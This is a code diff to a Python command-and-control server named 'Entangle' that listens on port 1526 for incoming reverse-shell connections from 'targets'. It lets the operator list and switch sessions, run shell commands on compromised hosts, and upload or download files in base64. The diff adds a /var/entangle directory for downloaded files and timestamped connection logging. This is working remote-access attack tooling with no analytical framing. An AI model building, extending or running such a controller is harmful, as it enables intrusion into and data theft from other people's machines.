@@ -2,7 +2,16 @@ import socket
 import json
 import threading
 import base64
+import datetime
+import os
 
+def basedir():
+    try:
+        os.mkdir(base_dir)
+    except OSError:
+        print("Error: Could not create %s directory" % base_dir)
+    else:
+        print("Alert: Succesful created the directory %s " % base_dir)
 
 def shell(target, ip):
     """Managing the shell commands. This function contains 2 additional functions called send and receive"""
@@ -40,9 +49,12 @@ def shell(target, ip):
             break
 
         elif command_input[:8] == "download":  # download file. will be using b64
-            with open(command_input[9:], "wb") as file:
+            location = (base_dir + "/" + command_input[9:])
+            with open(location, "wb") as file:
                 file_data = receive()
                 file.write(base64.b64decode(file_data))
+                print ("File was successfully downloaded at %s " % location)
+
 
         elif command_input[:6] == "upload":  # upload file. will be using b64
             with open(command_input[7:], "rb") as uload:
@@ -70,6 +82,7 @@ def shell(target, ip):
 def server():
     """Managing the Server"""
     global clients
+    now = datetime.datetime.now()
     while True:
         if stop_threads:
             break
@@ -78,50 +91,54 @@ def server():
             target, ip = s.accept()
             targets.append(target)
             ips.append(ip)
-            print ("**** " + ip[0] + " Has Connected ****")
+            print ("Connection from: IP: " + ip[0] + now.strftime(" was established. Time of connection was: %Y-%m-%d "
+                                                                  "%H:%M:%S"))
             # print(str(ips[clients]) + " Has Connected!")
             clients += 1
         except:
             pass
 
+if __name__ == "__main__":
+    global s
+    base_dir = "/var/entangle"
 
-global s
-ips = []
-targets = []
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(("0.0.0.0", 1526))  # server bind.  TODO. will make these arguments variables
-s.listen(5)
+    basedir()
+    ips = []
+    targets = []
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(("0.0.0.0", 1526))  # server bind.  TODO. will make these arguments variables
+    s.listen(5)
 
-clients = 0  # client count
-stop_threads = False
+    clients = 0  # client count
+    stop_threads = False
 
-print("Waiting for connections ....")
+    print("Waiting for connections ....")
 
-t1 = threading.Thread(target=server)  # allowing for multiple threads of the server
-t1.start()
+    t1 = threading.Thread(target=server)  # allowing for multiple threads of the server
+    t1.start()
 
-while True:
-    command = raw_input("Entangle: ")  # How to interact with the application
-    if command == "list":  # show a list of all active connections
-        count = 0
-        for ip in ips:
-            print ("Session " + str(count) + " ----> " + str(ip))
-            count += 1
+    while True:
+        command = raw_input("Entangle: ")  # How to interact with the application
+        if command == "list":  # show a list of all active connections
+            count = 0
+            for ip in ips:
+                print ("Session " + str(count) + " ----> " + str(ip))
+                count += 1
 
-    elif command[:7] == "session":  # switch between different sessions
-        try:
-            num = int(command[8:])
-            tarnum = targets[num]
-            tarip = ips[num]
-            shell(tarnum, tarip)
-        except:
-            print("Session not %s Found!" % num)
-            continue
-    elif command == "exit":  # Close server
-        for target in targets:
-            target.close()
-        s.close()
-        stop_threads = True
-        t1.join()
-        break
+        elif command[:7] == "session":  # switch between different sessions
+            try:
+                session_number = int(command[8:])
+                target_number = targets[session_number]
+                target_ip = ips[session_number]
+                shell(target_number, target_ip)
+            except:
+                print("Session not %s Found!" % session_number)
+                continue
+        elif command == "exit":  # Close server
+            for target in targets:
+                target.close()
+            s.close()
+            stop_threads = True
+            t1.join()
+            break
